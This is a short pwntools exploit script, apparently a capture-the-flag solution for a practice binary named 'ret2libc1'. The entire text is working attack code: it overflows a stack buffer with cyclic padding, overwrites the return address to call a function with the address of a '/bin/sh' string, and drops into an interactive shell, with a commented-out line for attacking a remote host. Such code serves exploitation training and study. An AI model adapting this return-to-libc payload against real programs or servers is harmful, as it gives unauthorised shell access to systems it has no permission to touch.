
from pwn import *

context(log_level='debug', arch='i386', os='linux')
pwnfile = './ret2libc1'
# io = remote('ipaddr', port)
io = process(pwnfile)
elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding2ebp = 0x6C # from the var to ebp
padding = padding2ebp + context.word_size//8

sh_addr = 0x08048720
ret_addr = 0x08048466

payload = flat([cyclic(padding), ret_addr, 0xdeadbeaf, sh_addr])
delimiter = "\n"
io.sendlineafter(delimiter, payload)
io.interactive()
